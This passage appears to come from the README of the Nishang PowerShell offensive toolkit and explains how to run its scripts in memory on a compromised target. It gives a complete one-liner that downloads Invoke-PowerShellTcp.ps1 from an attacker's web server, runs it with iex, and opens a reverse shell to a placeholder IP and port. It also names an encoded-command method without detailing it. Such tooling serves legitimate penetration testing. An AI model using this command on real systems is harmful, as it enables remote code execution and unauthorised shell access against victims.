The scripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:
 
Method 1. Use the in-memory dowload and execute:
 
Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. 
All the scripts in Nishang export a function with same name in the current PowerShell session.
 
# powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 
Method 2. Use the -encodedcommand (or -e) parameter of PowerShell:
All the scripts in Nishang export a function with same name in the current PowerShell session. 
